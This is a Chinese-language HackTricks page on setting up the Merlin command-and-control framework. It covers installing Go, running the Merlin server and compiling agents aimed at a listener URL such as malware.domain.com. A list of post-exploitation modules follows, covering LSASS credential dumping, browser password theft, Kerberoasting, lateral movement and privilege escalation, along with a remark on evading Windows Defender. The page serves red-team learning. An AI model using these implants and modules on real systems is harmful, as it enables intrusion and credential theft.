<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家，使用</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

其他支持HackTricks的方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>


# 安装

## 安装GO
```
#Download GO package from: https://golang.org/dl/
#Decompress the packe using:
tar -C /usr/local -xzf go$VERSION.$OS-$ARCH.tar.gz

#Change /etc/profile
Add ":/usr/local/go/bin" to PATH
Add "export GOPATH=$HOME/go"
Add "export GOBIN=$GOPATH/bin"

source /etc/profile
```
## 安装 Merlin
```
go get https://github.com/Ne0nd0g/merlin/tree/dev #It is recommended to use the developer branch
cd $GOPATH/src/github.com/Ne0nd0g/merlin/
```
# 启动 Merlin 服务器
```
go run cmd/merlinserver/main.go -i
```
# Merlin 代理

您可以[下载预编译代理](https://github.com/Ne0nd0g/merlin/releases)

## 编译代理

转到主文件夹 _$GOPATH/src/github.com/Ne0nd0g/merlin/_
```
#User URL param to set the listener URL
make #Server and Agents of all
make windows #Server and Agents for Windows
make windows-agent URL=https://malware.domain.com:443/ #Agent for windows (arm, dll, linux, darwin, javascript, mips)
```
## **手动编译代理程序**
```
GOOS=windows GOARCH=amd64 go build -ldflags "-X main.url=https://10.2.0.5:443" -o agent.exe main.g
```
# 模块

**坏消息是Merlin使用的每个模块都是从源（Github）下载并保存在磁盘上才能使用。在使用知名模块时要小心，因为Windows Defender会抓到你！**


**SafetyKatz** --> 修改版的Mimikatz。将LSASS转储到文件并运行:sekurlsa::logonpasswords到该文件\
**SharpDump** --> 为指定的进程ID进行minidump（默认为LSASS）（最终文件的扩展名是.gz，但实际上是.bin，是一个gz文件）\
**SharpRoast** --> Kerberoast（不起作用）\
**SeatBelt** --> 在CS中进行本地安全测试（不起作用）https://github.com/GhostPack/Seatbelt/blob/master/Seatbelt/Program.cs\
**Compiler-CSharp** --> 使用csc.exe /unsafe进行编译\
**Sharp-Up** --> 在powerup中使用C#进行所有检查（有效）\
**Inveigh** --> PowerShellADIDNS/LLMNR/mDNS/NBNS欺骗器和中间人工具（不起作用，需要加载：https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1）\
**Invoke-InternalMonologue** --> 模拟所有可用用户并为每个用户检索挑战-响应（每个用户的NTLM哈希）（坏的URL）\
**Invoke-PowerThIEf** --> 从IExplorer窃取表单或使其执行JS或在该进程中注入DLL（不起作用）（PS似乎也不起作用）https://github.com/nettitude/Invoke-PowerThIEf/blob/master/Invoke-PowerThIEf.ps1\
**LaZagneForensic** --> 获取浏览器密码（有效，但不打印输出目录）\
**dumpCredStore** --> Win32凭据管理器API（https://github.com/zetlen/clortho/blob/master/CredMan.ps1）https://www.digitalcitizen.life/credential-manager-where-windows-stores-passwords-other-login-details\
**Get-InjectedThread** --> 检测运行进程中的经典注入（经典注入（OpenProcess，VirtualAllocEx，WriteProcessMemory，CreateRemoteThread））（不起作用）\
**Get-OSTokenInformation** --> 获取正在运行的进程和线程的令牌信息（用户、组、特权、所有者... https://docs.microsoft.com/es-es/windows/desktop/api/winnt/ne-winnt-\_token_information_class）\
**Invoke-DCOM** --> 通过DCOM执行命令（在其他计算机上）（http://www.enigma0x3.net.）（https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/）\
**Invoke-DCOMPowerPointPivot** --> 滥用PowerPoint COM对象（ADDin）在其他PC中执行命令\
**Invoke-ExcelMacroPivot** --> 滥用Excel中的DCOM在其他PC中执行命令\
**Find-ComputersWithRemoteAccessPolicies** -->（不起作用）（https://labs.mwrinfosecurity.com/blog/enumerating-remote-access-policies-through-gpo/）\
**Grouper** --> 它转储组策略的所有最有趣的部分，然后在其中寻找可利用的内容（已弃用）看看Grouper2，看起来非常好\
**Invoke-WMILM** --> 使用WMI进行横向移动\
**Get-GPPPassword** --> 查找groups.xml，scheduledtasks.xml，services.xml和datasources.xml并返回明文密码（在域内）\
**Invoke-Mimikatz** --> 使用mimikatz（默认转储凭据）\
**PowerUp** --> https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc\
**Find-BadPrivilege** --> 检查计算机用户的特权\
**Find-PotentiallyCrackableAccounts** --> 检索与SPN相关联的用户帐户的信息（Kerberoasting）\
**psgetsystem** --> 获取系统

**未检查持久性模块**

# 简介

我真的很喜欢这个工具的感觉和潜力。\
希望该工具开始从服务器下载模块并在下载脚本时集成某种逃避机制。


<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**上关注**我们。
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
